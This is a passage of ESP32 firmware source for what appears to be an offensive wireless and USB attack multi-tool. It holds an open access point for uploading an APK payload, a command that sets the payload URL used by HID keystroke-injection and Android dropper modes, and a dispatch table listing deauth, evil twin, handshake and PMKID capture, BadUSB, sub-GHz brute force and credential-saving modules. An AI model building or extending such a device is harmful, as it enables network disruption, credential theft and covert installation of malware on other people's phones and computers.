        }
      }
      else if (up.status == UPLOAD_FILE_END){
        apkup_lastSize = bytesWritten;
        if (f) {
          f.close();
          LOGF("[*] upload done %u bytes written -> %s (http recv %u)\n",
               (unsigned)bytesWritten, apkup_lastName.c_str(), (unsigned)up.totalSize);
        } else {
          LOGF("[!] upload end: file was never opened (%u bytes lost)\n", (unsigned)up.totalSize);
        }
      }
      else if (up.status == UPLOAD_FILE_ABORTED){
        if (f) { f.close(); }
        LOGF("[!] upload aborted after %u bytes\n", (unsigned)bytesWritten);
      }
    });
  http.on("/list", HTTP_GET, [](){
    File root = LittleFS.open("/");
    String s = "";
    File f = root.openNextFile();
    while (f){
      String name = f.name();
      if (!name.startsWith("/")) name = "/" + name;
      size_t sz = f.size();
      if (sz == 0) {
        File check = LittleFS.open(name, "r");
        if (check) { sz = check.size(); check.close(); }
      }
      s += name + " " + String((int)sz) + "\n";
      f = root.openNextFile();
    }
    root.close();
    http.send(200, "text/plain", s);
  });
  http.on("/", HTTP_GET, [](){
    http.send(200, "text/html",
      "<h1>APK upload</h1><p>POST multipart to <code>/upload</code></p>"
      "<pre>curl -F 'file=@omg.apk' http://192.168.4.1/upload</pre>"
      "<p><a href=/list>list files</a></p>");
  });
  apkup_registered = true;
}
void apkup_begin(){
  dashboardDropAp();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("APKUP", nullptr, 6, 0, 4);
  apkup_register();
  http.begin();
  LOGF("[*] AP now: APKUP (open) ip %s\n", WiFi.softAPIP().toString().c_str());
  LOG("[*] from PC: curl -F 'file=@omg.apk' http://192.168.4.1/upload\n");
}
void apkup_tick(){ http.handleClient(); delay(2); }
void apkup_end(){
  http.stop();
  WiFi.softAPdisconnect(true);
  dashboardRestoreAp();
}
void apkup_cmd(const String& s){
  if (s=="?"){ LOG("apkup [start|stop|list]\n"); return; }
  if (s=="list"){
    File root = LittleFS.open("/");
    File f = root.openNextFile();
    while (f){
      String name = f.name();
      if (!name.startsWith("/")) name = "/" + name;
      size_t sz = f.size();
      if (sz == 0) {
        // workaround: reopen to get real size
        File check = LittleFS.open(name, "r");
        if (check) { sz = check.size(); check.close(); }
      }
      LOGF("%s %d\n", name.c_str(), (int)sz);
      f = root.openNextFile();
    }
    root.close();
    return;
  }
  if (s=="stop"){ apkup_end(); return; }
  apkup_begin();
}

// ============================================================
// URL — global command. sets the payload URL used by dropserv hid
// and android go. persisted to /url.txt.
// ============================================================

extern String hid_payload;

void url_cmd(const String& s) {
  if (s == "?" || s.length() == 0) {
    LOGF("[*] url: %s\n", hid_payload.c_str());
    LOG("[*] url [set http://x/y.apk | reset | save | load]\n");
    return;
  }
  if (s == "reset") {
    hid_payload = "http://192.168.4.1/omg.apk";
    url_save();
    LOG("[*] url -> " + hid_payload + "\n");
    return;
  }
  if (s == "save") { url_save(); LOG("[*] saved\n"); return; }
  if (s == "load") {
    if (LittleFS.exists("/url.txt")) {
      File f = LittleFS.open("/url.txt", "r");
      hid_payload = f.readStringUntil('\n'); hid_payload.trim(); f.close();
      LOG("[*] url -> " + hid_payload + "\n");
    } else LOG("[*] no saved url\n");
    return;
  }
  if (s.startsWith("set ")) {
    hid_payload = s.substring(4);
    if (!hid_payload.startsWith("http")) hid_payload = "http://" + hid_payload;
    url_save();
    LOG("[*] url -> " + hid_payload + "\n");
    return;
  }
  hid_payload = s;
  if (!hid_payload.startsWith("http")) hid_payload = "http://" + hid_payload;
  url_save();
  LOG("[*] url -> " + hid_payload + "\n");
}

// ============================================================
// dispatch table — THE SPINE
// ============================================================
const SlotDef SLOTS[SLOT_COUNT] = {
  {"IDLE","idle",idle_begin,idle_tick,idle_end,idle_cmd},
  {"WIFI SCAN","scan",wifiscan_begin,wifiscan_tick,wifiscan_end,wifiscan_cmd},
  {"DEAUTH","deauth",deauth_begin,deauth_tick,deauth_end,deauth_cmd},
  {"BEACON","beacon",beacon_begin,beacon_tick,beacon_end,beacon_cmd},
  {"PROBE SNIF","probe",probe_begin,probe_tick,probe_end,probe_cmd},
  {"PROBE FLUD","pflood",pflood_begin,pflood_tick,pflood_end,pflood_cmd},
  {"PMKID","pmkid",pmkid_begin,pmkid_tick,pmkid_end,pmkid_cmd},
  {"HANDSHAKE","hs",hs_begin,hs_tick,hs_end,hs_cmd},
  {"EVIL TWIN","eviltwin",eviltwin_begin,eviltwin_tick,eviltwin_end,eviltwin_cmd},
  {"DEAUTH DET","wids",wids_begin,wids_tick,wids_end,wids_cmd},
  {"BLE SPAM","blespam",blespam_begin,blespam_tick,blespam_end,blespam_cmd},
  {"BLE SCAN","blescan",blescan_begin,blescan_tick,blescan_end,blescan_cmd},
  {"BLE BEACON","blebeacon",blebeacon_begin,blebeacon_tick,blebeacon_end,blebeacon_cmd},
  {"HID TYPE","hid",hid_begin,hid_tick,hid_end,hid_cmd},
  {"DUCKYS","ducky",ducky_begin,ducky_tick,ducky_end,ducky_cmd},
  {"HID MOUSE","mouse",hidmouse_begin,hidmouse_tick,hidmouse_end,hidmouse_cmd},
  {"RF REPLAY","rf",rf_begin,rf_tick,rf_end,rf_cmd},
  {"IR BLAST","ir",ir_begin,ir_tick,ir_end,ir_cmd},
  {"BADUSB","badusb",badusb_begin,badusb_tick,badusb_end,badusb_cmd},
  {"NRF SNIFF","nrf",nrf_begin,nrf_tick,nrf_end,nrf_cmd},
  {"PINEAPPLE","pine",pine_begin,pine_tick,pine_end,pine_cmd},
  {"PORTAL","portal",portal_begin,portal_tick,portal_end,portal_cmd},
  {"GPS LOG","gps",gps_begin,gps_tick,gps_end,gps_cmd},
  {"INFO","info",info_begin,info_tick,info_end,info_cmd},
  {"PANIC","panic",panic_begin,panic_tick,panic_end,panic_cmd},
  {"IR RECV","irrecv",irrecv_begin,irrecv_tick,irrecv_end,irrecv_cmd},
  {"RF EDGE","rfedge",rfedge_begin,rfedge_tick,rfedge_end,rfedge_cmd},
  {"CREDS SAVE","persist",persist_begin,persist_tick,persist_end,persist_cmd},
  {"SUBGHZ BRUT","subghz",subghz_begin,subghz_tick,subghz_end,subghz_cmd},
  {"HONEYPOT","honey",honey_begin,honey_tick,honey_end,honey_cmd},
  {"BT PAIR SNIF","btpair",btpair_begin,btpair_tick,btpair_end,btpair_cmd},
  {"OTA UPDATE","ota",ota_begin,ota_tick,ota_end,ota_cmd},
  {"DROPSERV","dropserv",dropserv_begin,dropserv_tick,dropserv_end,dropserv_cmd},
  {"ANDROID","android",android_begin,android_tick,android_end,android_cmd},
  {"APKUP","apkup",apkup_begin,apkup_tick,apkup_end,apkup_cmd},
};